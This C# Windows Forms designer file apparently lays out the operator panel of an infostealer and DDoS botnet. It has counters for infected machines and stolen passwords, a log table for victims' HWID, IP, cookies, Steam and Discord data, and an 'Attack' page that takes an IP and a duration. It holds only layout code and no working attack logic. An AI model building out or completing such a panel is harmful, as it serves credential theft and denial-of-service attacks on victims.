namespace Customer_GUI
{
    partial class Form1
    {
        /// <summary>
        /// Required designer variable.
        /// </summary>
        private System.ComponentModel.IContainer components = null;

        /// <summary>
        /// Clean up any resources being used.
        /// </summary>
        /// <param name="disposing">true if managed resources should be disposed; otherwise, false.</param>
        protected override void Dispose(bool disposing)
        {
            if (disposing && (components != null))
            {
                components.Dispose();
            }
            base.Dispose(disposing);
        }

        #region Windows Form Designer generated code

        /// <summary>
        /// Required method for Designer support - do not modify
        /// the contents of this method with the code editor.
        /// </summary>
        private void InitializeComponent()
        {
            this.light = new System.Windows.Forms.Button();
            this.button1 = new System.Windows.Forms.Button();
            this.checkBox1 = new System.Windows.Forms.CheckBox();
            this.Machinecount = new System.Windows.Forms.Label();
            this.Logcount = new System.Windows.Forms.Label();
            this.label3 = new System.Windows.Forms.Label();
            this.Machinespage = new System.Windows.Forms.GroupBox();
            this.DDospage = new System.Windows.Forms.GroupBox();
            this.Logspage = new System.Windows.Forms.GroupBox();
            this.passwordcount = new System.Windows.Forms.Label();
            this.groupBox3 = new System.Windows.Forms.GroupBox();
            this.groupBox1 = new System.Windows.Forms.GroupBox();
            this.Logss = new System.Windows.Forms.GroupBox();
            this.DDDDOs = new System.Windows.Forms.GroupBox();
            this.groupBox2 = new System.Windows.Forms.GroupBox();
            this.ip = new System.Windows.Forms.TextBox();
            this.text = new System.Windows.Forms.TextBox();
            this.Attack_btn = new System.Windows.Forms.Button();
            this.label1 = new System.Windows.Forms.Label();
            this.label2 = new System.Windows.Forms.Label();
            this.Logs = new System.Windows.Forms.Button();
            this.button2 = new System.Windows.Forms.Button();
            this.button4 = new System.Windows.Forms.Button();
            this.flowLayoutPanel1 = new System.Windows.Forms.FlowLayoutPanel();
            this.panel1 = new System.Windows.Forms.Panel();
            this.pictureBox1 = new System.Windows.Forms.PictureBox();
            this.label4 = new System.Windows.Forms.Label();
            this.label5 = new System.Windows.Forms.Label();
            this.label6 = new System.Windows.Forms.Label();
            this.label7 = new System.Windows.Forms.Label();
            this.label8 = new System.Windows.Forms.Label();
            this.label9 = new System.Windows.Forms.Label();
            this.label10 = new System.Windows.Forms.Label();
            this.label11 = new System.Windows.Forms.Label();
            this.label12 = new System.Windows.Forms.Label();
            this.HWID1LABEL = new System.Windows.Forms.Label();
            this.IP1 = new System.Windows.Forms.Label();
            this.label13 = new System.Windows.Forms.Label();
            this.label14 = new System.Windows.Forms.Label();
            this.label15 = new System.Windows.Forms.Label();
            this.label16 = new System.Windows.Forms.Label();
            this.label17 = new System.Windows.Forms.Label();
            this.label18 = new System.Windows.Forms.Label();
            this.Logss.SuspendLayout();
            this.groupBox2.SuspendLayout();
            this.flowLayoutPanel1.SuspendLayout();
            this.panel1.SuspendLayout();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox1)).BeginInit();
            this.SuspendLayout();
            // 
            // light
            // 
            this.light.Cursor = System.Windows.Forms.Cursors.Default;
            this.light.FlatAppearance.BorderSize = 0;
            this.light.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
            this.light.Location = new System.Drawing.Point(684, 12);
            this.light.Name = "light";
            this.light.Size = new System.Drawing.Size(75, 23);
            this.light.TabIndex = 0;
            this.light.Text = "Light mode.";
            this.light.UseCompatibleTextRendering = true;
            this.light.UseVisualStyleBackColor = true;
            this.light.Click += new System.EventHandler(this.light_Click);
            // 
            // button1
            // 
            this.button1.BackColor = System.Drawing.Color.Red;
            this.button1.FlatAppearance.BorderSize = 0;
            this.button1.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
            this.button1.Location = new System.Drawing.Point(765, 12);
            this.button1.Name = "button1";
            this.button1.Size = new System.Drawing.Size(23, 23);
            this.button1.TabIndex = 1;
            this.button1.Text = "X";
            this.button1.UseVisualStyleBackColor = false;
            this.button1.Click += new System.EventHandler(this.Exitbutton_click);
            // 
            // checkBox1
            // 
            this.checkBox1.AutoSize = true;
            this.checkBox1.Font = new System.Drawing.Font("Nirmala UI", 8.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.checkBox1.Location = new System.Drawing.Point(12, 421);
            this.checkBox1.Name = "checkBox1";
            this.checkBox1.Size = new System.Drawing.Size(82, 17);
            this.checkBox1.TabIndex = 5;
            this.checkBox1.Text = "Connected";
            this.checkBox1.UseVisualStyleBackColor = true;
            this.checkBox1.CheckedChanged += new System.EventHandler(this.checkBox1_CheckedChanged);
            // 
            // Machinecount
            // 
            this.Machinecount.AutoSize = true;
            this.Machinecount.Location = new System.Drawing.Point(12, 405);
            this.Machinecount.Name = "Machinecount";
            this.Machinecount.Size = new System.Drawing.Size(62, 13);
            this.Machinecount.TabIndex = 8;
            this.Machinecount.Text = "0 Machines";
            this.Machinecount.Click += new System.EventHandler(this.label1_Click);
            // 
            // Logcount
            // 
            this.Logcount.AutoSize = true;
            this.Logcount.Location = new System.Drawing.Point(12, 379);
            this.Logcount.Name = "Logcount";
            this.Logcount.Size = new System.Drawing.Size(39, 13);
            this.Logcount.TabIndex = 9;
            this.Logcount.Text = "0 Logs";
            this.Logcount.Click += new System.EventHandler(this.label2_Click);
            // 
            // label3
            // 
            this.label3.AutoSize = true;
            this.label3.Location = new System.Drawing.Point(12, 392);
            this.label3.Name = "label3";
            this.label3.Size = new System.Drawing.Size(0, 13);
            this.label3.TabIndex = 10;
            // 
            // Machinespage
            // 
            this.Machinespage.Location = new System.Drawing.Point(174, 12);
            this.Machinespage.Name = "Machinespage";
            this.Machinespage.Size = new System.Drawing.Size(504, 426);
            this.Machinespage.TabIndex = 11;
            this.Machinespage.TabStop = false;
            this.Machinespage.Text = "Machines";
            this.Machinespage.Visible = false;
            this.Machinespage.Enter += new System.EventHandler(this.groupBox1_Enter);
            // 
            // DDospage
            // 
            this.DDospage.Location = new System.Drawing.Point(0, 0);
            this.DDospage.Name = "DDospage";
            this.DDospage.Size = new System.Drawing.Size(504, 426);
            this.DDospage.TabIndex = 12;
            this.DDospage.TabStop = false;
            this.DDospage.Text = "DDos";
            this.DDospage.Visible = false;
            this.DDospage.Enter += new System.EventHandler(this.groupBox2_Enter);
            // 
            // Logspage
            // 
            this.Logspage.Location = new System.Drawing.Point(174, 12);
            this.Logspage.Name = "Logspage";
            this.Logspage.Size = new System.Drawing.Size(504, 426);
            this.Logspage.TabIndex = 13;
            this.Logspage.TabStop = false;
            this.Logspage.Text = "Logs";
            this.Logspage.Visible = false;
            // 
            // passwordcount
            // 
            this.passwordcount.AutoSize = true;
            this.passwordcount.Location = new System.Drawing.Point(12, 392);
            this.passwordcount.Name = "passwordcount";
            this.passwordcount.Size = new System.Drawing.Size(67, 13);
            this.passwordcount.TabIndex = 13;
            this.passwordcount.Text = "0 Passwords";
            this.passwordcount.Click += new System.EventHandler(this.label4_Click);
            // 
            // groupBox3
            // 
            this.groupBox3.Location = new System.Drawing.Point(0, 0);
            this.groupBox3.Name = "groupBox3";
            this.groupBox3.Size = new System.Drawing.Size(504, 426);
            this.groupBox3.TabIndex = 13;
            this.groupBox3.TabStop = false;
            this.groupBox3.Text = "Logs";
            this.groupBox3.Visible = false;
            // 
            // groupBox1
            // 
            this.groupBox1.Location = new System.Drawing.Point(174, 12);
            this.groupBox1.Name = "groupBox1";
            this.groupBox1.Size = new System.Drawing.Size(504, 426);
            this.groupBox1.TabIndex = 12;
            this.groupBox1.TabStop = false;
            this.groupBox1.Text = "Machines";
            this.groupBox1.Visible = false;
            // 
            // Logss
            // 
            this.Logss.Controls.Add(this.label12);
            this.Logss.Controls.Add(this.label10);
            this.Logss.Controls.Add(this.label9);
            this.Logss.Controls.Add(this.label8);
            this.Logss.Controls.Add(this.label7);
            this.Logss.Controls.Add(this.label6);
            this.Logss.Controls.Add(this.label5);
            this.Logss.Controls.Add(this.label4);
            this.Logss.Controls.Add(this.panel1);
            this.Logss.Controls.Add(this.flowLayoutPanel1);
            this.Logss.Location = new System.Drawing.Point(174, 12);
            this.Logss.Name = "Logss";
            this.Logss.Size = new System.Drawing.Size(504, 426);
            this.Logss.TabIndex = 12;
            this.Logss.TabStop = false;
            this.Logss.Text = "Logs";
            this.Logss.Visible = false;
            // 
            // DDDDOs
            // 
            this.DDDDOs.Location = new System.Drawing.Point(0, 0);
            this.DDDDOs.Name = "DDDDOs";
            this.DDDDOs.Size = new System.Drawing.Size(504, 426);
            this.DDDDOs.TabIndex = 13;
            this.DDDDOs.TabStop = false;
            this.DDDDOs.Text = "DDos";
            this.DDDDOs.Visible = false;
            // 
            // groupBox2
            // 
            this.groupBox2.Controls.Add(this.label2);
            this.groupBox2.Controls.Add(this.label1);
            this.groupBox2.Controls.Add(this.Attack_btn);
            this.groupBox2.Controls.Add(this.text);
            this.groupBox2.Controls.Add(this.ip);
            this.groupBox2.Location = new System.Drawing.Point(174, 12);
            this.groupBox2.Name = "groupBox2";
            this.groupBox2.Size = new System.Drawing.Size(504, 426);
            this.groupBox2.TabIndex = 13;
            this.groupBox2.TabStop = false;
            this.groupBox2.Text = "Ddos";
            this.groupBox2.Visible = false;
            this.groupBox2.Enter += new System.EventHandler(this.groupBox2_Enter_1);
            // 
            // ip
            // 
            this.ip.AccessibleRole = System.Windows.Forms.AccessibleRole.IpAddress;
            this.ip.Location = new System.Drawing.Point(27, 41);
            this.ip.Name = "ip";
            this.ip.Size = new System.Drawing.Size(100, 20);
            this.ip.TabIndex = 0;
            // 
            // text
            // 
            this.text.Location = new System.Drawing.Point(157, 41);
            this.text.MaxLength = 6;
            this.text.Name = "text";
            this.text.Size = new System.Drawing.Size(32, 20);
            this.text.TabIndex = 1;
            // 
            // Attack_btn
            // 
            this.Attack_btn.Location = new System.Drawing.Point(90, 72);
            this.Attack_btn.Name = "Attack_btn";
            this.Attack_btn.Size = new System.Drawing.Size(75, 23);
            this.Attack_btn.TabIndex = 2;
            this.Attack_btn.Text = "Attack";
            this.Attack_btn.UseVisualStyleBackColor = true;
            // 
            // label1
            // 
            this.label1.AutoSize = true;
            this.label1.Location = new System.Drawing.Point(135, 32);
            this.label1.Name = "label1";
            this.label1.Size = new System.Drawing.Size(30, 13);
            this.label1.TabIndex = 3;
            this.label1.Text = "Time";
            this.label1.Click += new System.EventHandler(this.label1_Click_1);
            // 
            // label2
            // 
            this.label2.AutoSize = true;
            this.label2.Location = new System.Drawing.Point(24, 32);
            this.label2.Name = "label2";
            this.label2.Size = new System.Drawing.Size(16, 13);
            this.label2.TabIndex = 4;
            this.label2.Text = "Ip";
            // 
            // Logs
            // 
            this.Logs.BackColor = System.Drawing.Color.White;
            this.Logs.BackgroundImage = global::Customer_GUI.Properties.Resources.web_button_gradient_button_png__1__removebg_preview;
            this.Logs.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Zoom;
            this.Logs.FlatAppearance.BorderSize = 0;
            this.Logs.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
            this.Logs.Font = new System.Drawing.Font("Nirmala UI", 12F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.Logs.ForeColor = System.Drawing.Color.Transparent;
            this.Logs.ImageKey = "(none)";
            this.Logs.Location = new System.Drawing.Point(12, 124);
            this.Logs.Name = "Logs";
            this.Logs.Size = new System.Drawing.Size(156, 50);
            this.Logs.TabIndex = 7;
            this.Logs.Text = "Logs";
            this.Logs.TextImageRelation = System.Windows.Forms.TextImageRelation.TextAboveImage;
            this.Logs.UseVisualStyleBackColor = false;
            this.Logs.Click += new System.EventHandler(this.Logs_click);
            // 
            // button2
            // 
            this.button2.BackColor = System.Drawing.Color.White;
            this.button2.BackgroundImage = global::Customer_GUI.Properties.Resources.web_button_gradient_button_png__1__removebg_preview;
            this.button2.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Zoom;
            this.button2.FlatAppearance.BorderSize = 0;
            this.button2.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
            this.button2.Font = new System.Drawing.Font("Nirmala UI", 12F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.button2.ForeColor = System.Drawing.Color.Transparent;
            this.button2.Location = new System.Drawing.Point(12, 68);
            this.button2.Name = "button2";
            this.button2.Size = new System.Drawing.Size(156, 50);
            this.button2.TabIndex = 6;
            this.button2.Text = "DDos";
            this.button2.TextImageRelation = System.Windows.Forms.TextImageRelation.TextAboveImage;
            this.button2.UseVisualStyleBackColor = false;
            this.button2.Click += new System.EventHandler(this.DDos_click);
            // 
            // button4
            // 
            this.button4.BackColor = System.Drawing.Color.White;
            this.button4.BackgroundImage = global::Customer_GUI.Properties.Resources.web_button_gradient_button_png__1__removebg_preview;
            this.button4.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Zoom;
            this.button4.FlatAppearance.BorderSize = 0;
            this.button4.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
            this.button4.Font = new System.Drawing.Font("Nirmala UI", 12F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.button4.ForeColor = System.Drawing.Color.Transparent;
            this.button4.Location = new System.Drawing.Point(12, 12);
            this.button4.Name = "button4";
            this.button4.Size = new System.Drawing.Size(156, 50);
            this.button4.TabIndex = 4;
            this.button4.TabStop = false;
            this.button4.Text = "Machines";
            this.button4.TextImageRelation = System.Windows.Forms.TextImageRelation.TextAboveImage;
            this.button4.UseCompatibleTextRendering = true;
            this.button4.UseVisualStyleBackColor = false;
            this.button4.Click += new System.EventHandler(this.button4_Click);
            // 
            // flowLayoutPanel1
            // 
            this.flowLayoutPanel1.Controls.Add(this.label11);
            this.flowLayoutPanel1.Location = new System.Drawing.Point(6, 32);
            this.flowLayoutPanel1.Name = "flowLayoutPanel1";
            this.flowLayoutPanel1.Size = new System.Drawing.Size(492, 388);
            this.flowLayoutPanel1.TabIndex = 0;
            // 
            // panel1
            // 
            this.panel1.Controls.Add(this.label18);
            this.panel1.Controls.Add(this.label17);
            this.panel1.Controls.Add(this.label16);
            this.panel1.Controls.Add(this.label15);
            this.panel1.Controls.Add(this.label14);
            this.panel1.Controls.Add(this.label13);
            this.panel1.Controls.Add(this.IP1);
            this.panel1.Controls.Add(this.HWID1LABEL);
            this.panel1.Controls.Add(this.pictureBox1);
            this.panel1.Location = new System.Drawing.Point(6, 32);
            this.panel1.Name = "panel1";
            this.panel1.Size = new System.Drawing.Size(492, 40);
            this.panel1.TabIndex = 0;
            // 
            // pictureBox1
            // 
            this.pictureBox1.Image = global::Customer_GUI.Properties.Resources.Removal_835;
            this.pictureBox1.Location = new System.Drawing.Point(3, 1);
            this.pictureBox1.Name = "pictureBox1";
            this.pictureBox1.Size = new System.Drawing.Size(43, 39);
            this.pictureBox1.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage;
            this.pictureBox1.TabIndex = 0;
            this.pictureBox1.TabStop = false;
            // 
            // label4
            // 
            this.label4.AutoSize = true;
            this.label4.Location = new System.Drawing.Point(62, 13);
            this.label4.Name = "label4";
            this.label4.Size = new System.Drawing.Size(31, 13);
            this.label4.TabIndex = 1;
            this.label4.Text = "Hwid";
            this.label4.Click += new System.EventHandler(this.label4_Click_1);
            // 
            // label5
            // 
            this.label5.AutoSize = true;
            this.label5.Location = new System.Drawing.Point(125, 13);
            this.label5.Name = "label5";
            this.label5.Size = new System.Drawing.Size(17, 13);
            this.label5.TabIndex = 2;
            this.label5.Text = "IP";
            // 
            // label6
            // 
            this.label6.AutoSize = true;
            this.label6.Location = new System.Drawing.Point(160, 13);
            this.label6.Name = "label6";
            this.label6.Size = new System.Drawing.Size(58, 13);
            this.label6.TabIndex = 3;
            this.label6.Text = "Passwords";
            // 
            // label7
            // 
            this.label7.AutoSize = true;
            this.label7.Location = new System.Drawing.Point(224, 13);
            this.label7.Name = "label7";
            this.label7.Size = new System.Drawing.Size(45, 13);
            this.label7.TabIndex = 4;
            this.label7.Text = "Cookies";
            // 
            // label8
            // 
            this.label8.AutoSize = true;
            this.label8.Location = new System.Drawing.Point(275, 13);
            this.label8.Name = "label8";
            this.label8.Size = new System.Drawing.Size(60, 13);
            this.label8.TabIndex = 5;
            this.label8.Text = "Bookmarks";
            // 
            // label9
            // 
            this.label9.AutoSize = true;
            this.label9.Location = new System.Drawing.Point(341, 13);
            this.label9.Name = "label9";
            this.label9.Size = new System.Drawing.Size(37, 13);
            this.label9.TabIndex = 6;
            this.label9.Text = "Steam";
            this.label9.Click += new System.EventHandler(this.label9_Click);
            // 
            // label10
            // 
            this.label10.AutoSize = true;
            this.label10.Location = new System.Drawing.Point(384, 13);
            this.label10.Name = "label10";
            this.label10.Size = new System.Drawing.Size(43, 13);
            this.label10.TabIndex = 7;
            this.label10.Text = "Discord";
            // 
            // label11
            // 
            this.label11.AutoSize = true;
            this.label11.Location = new System.Drawing.Point(3, 0);
            this.label11.Name = "label11";
            this.label11.Size = new System.Drawing.Size(43, 13);
            this.label11.TabIndex = 8;
            this.label11.Text = "Discord";
            // 
            // label12
            // 
            this.label12.AutoSize = true;
            this.label12.Location = new System.Drawing.Point(433, 13);
            this.label12.Name = "label12";
            this.label12.Size = new System.Drawing.Size(71, 13);
            this.label12.TabIndex = 8;
            this.label12.Text = "Elapsed Time";
            this.label12.Click += new System.EventHandler(this.label12_Click);
            // 
            // HWID1LABEL
            // 
            this.HWID1LABEL.AutoSize = true;
            this.HWID1LABEL.Font = new System.Drawing.Font("Microsoft Tai Le", 8.25F, System.Drawing.FontStyle.Italic, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.HWID1LABEL.Location = new System.Drawing.Point(52, 14);
            this.HWID1LABEL.Name = "HWID1LABEL";
            this.HWID1LABEL.Size = new System.Drawing.Size(43, 14);
            this.HWID1LABEL.TabIndex = 1;
            this.HWID1LABEL.Text = "HWID1";
            this.HWID1LABEL.Click += new System.EventHandler(this.HWID1LABEL_Click);
            // 
            // IP1
            // 
            this.IP1.AutoSize = true;
            this.IP1.Location = new System.Drawing.Point(107, 15);
            this.IP1.Name = "IP1";
            this.IP1.Size = new System.Drawing.Size(52, 13);
            this.IP1.TabIndex = 2;
            this.IP1.Text = "127.0.0.1";
            // 
            // label13
            // 
            this.label13.AutoSize = true;
            this.label13.Location = new System.Drawing.Point(170, 15);
            this.label13.Name = "label13";
            this.label13.Size = new System.Drawing.Size(13, 13);
            this.label13.TabIndex = 3;
            this.label13.Text = "0";
            // 
            // label14
            // 
            this.label14.AutoSize = true;
            this.label14.Location = new System.Drawing.Point(234, 15);
            this.label14.Name = "label14";
            this.label14.Size = new System.Drawing.Size(13, 13);
            this.label14.TabIndex = 4;
            this.label14.Text = "0";
            // 
            // label15
            // 
            this.label15.AutoSize = true;
            this.label15.Location = new System.Drawing.Point(293, 15);
            this.label15.Name = "label15";
            this.label15.Size = new System.Drawing.Size(13, 13);
            this.label15.TabIndex = 5;
            this.label15.Text = "0";
            // 
            // label16
            // 
            this.label16.AutoSize = true;
            this.label16.Location = new System.Drawing.Point(346, 15);
            this.label16.Name = "label16";
            this.label16.Size = new System.Drawing.Size(13, 13);
            this.label16.TabIndex = 6;
            this.label16.Text = "0";
            // 
            // label17
            // 
            this.label17.AutoSize = true;
            this.label17.Location = new System.Drawing.Point(390, 14);
            this.label17.Name = "label17";
            this.label17.Size = new System.Drawing.Size(13, 13);
            this.label17.TabIndex = 7;
            this.label17.Text = "0";
            // 
            // label18
            // 
            this.label18.AutoSize = true;
            this.label18.Location = new System.Drawing.Point(430, 15);
            this.label18.Name = "label18";
            this.label18.Size = new System.Drawing.Size(37, 13);
            this.label18.TabIndex = 8;
            this.label18.Text = "99999";
            // 
            // Form1
            // 
            this.AutoScaleDimensions = new System.Drawing.SizeF(6F, 13F);
            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
            this.AutoSizeMode = System.Windows.Forms.AutoSizeMode.GrowAndShrink;
            this.BackgroundImageLayout = System.Windows.Forms.ImageLayout.None;
            this.ClientSize = new System.Drawing.Size(800, 450);
            this.Controls.Add(this.passwordcount);
            this.Controls.Add(this.label3);
            this.Controls.Add(this.Logcount);
            this.Controls.Add(this.Machinecount);
            this.Controls.Add(this.Logs);
            this.Controls.Add(this.button2);
            this.Controls.Add(this.checkBox1);
            this.Controls.Add(this.button4);
            this.Controls.Add(this.button1);
            this.Controls.Add(this.light);
            this.Controls.Add(this.Logss);
            this.Controls.Add(this.groupBox2);
            this.Controls.Add(this.groupBox1);
            this.Controls.Add(this.Machinespage);
            this.Cursor = System.Windows.Forms.Cursors.Default;
            this.FormBorderStyle = System.Windows.Forms.FormBorderStyle.None;
            this.Name = "Form1";
            this.Text = "Form1";
            this.Load += new System.EventHandler(this.Form1_Load);
            this.Logss.ResumeLayout(false);
            this.Logss.PerformLayout();
            this.groupBox2.ResumeLayout(false);
            this.groupBox2.PerformLayout();
            this.flowLayoutPanel1.ResumeLayout(false);
            this.flowLayoutPanel1.PerformLayout();
            this.panel1.ResumeLayout(false);
            this.panel1.PerformLayout();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox1)).EndInit();
            this.ResumeLayout(false);
            this.PerformLayout();

        }

        #endregion

        private System.Windows.Forms.Button light;
        private System.Windows.Forms.Button button1;
        private System.Windows.Forms.Button button4;
        private System.Windows.Forms.CheckBox checkBox1;
        private System.Windows.Forms.Button button2;
        private System.Windows.Forms.Button Logs;
        private System.Windows.Forms.Label Machinecount;
        private System.Windows.Forms.Label Logcount;
        private System.Windows.Forms.Label label3;
        private System.Windows.Forms.GroupBox Machinespage;
        private System.Windows.Forms.GroupBox DDospage;
        private System.Windows.Forms.GroupBox Logspage;
        private System.Windows.Forms.Label passwordcount;
        private System.Windows.Forms.GroupBox groupBox3;
        private System.Windows.Forms.GroupBox groupBox1;
        private System.Windows.Forms.GroupBox Logss;
        private System.Windows.Forms.GroupBox DDDDOs;
        private System.Windows.Forms.GroupBox groupBox2;
        private System.Windows.Forms.TextBox ip;
        private System.Windows.Forms.TextBox text;
        private System.Windows.Forms.Button Attack_btn;
        private System.Windows.Forms.Label label1;
        private System.Windows.Forms.Label label2;
        private System.Windows.Forms.Panel panel1;
        private System.Windows.Forms.PictureBox pictureBox1;
        private System.Windows.Forms.FlowLayoutPanel flowLayoutPanel1;
        private System.Windows.Forms.Label label4;
        private System.Windows.Forms.Label label9;
        private System.Windows.Forms.Label label8;
        private System.Windows.Forms.Label label7;
        private System.Windows.Forms.Label label6;
        private System.Windows.Forms.Label label5;
        private System.Windows.Forms.Label label12;
        private System.Windows.Forms.Label label10;
        private System.Windows.Forms.Label label11;
        private System.Windows.Forms.Label HWID1LABEL;
        private System.Windows.Forms.Label label18;
        private System.Windows.Forms.Label label17;
        private System.Windows.Forms.Label label16;
        private System.Windows.Forms.Label label15;
        private System.Windows.Forms.Label label14;
        private System.Windows.Forms.Label label13;
        private System.Windows.Forms.Label IP1;
    }
}

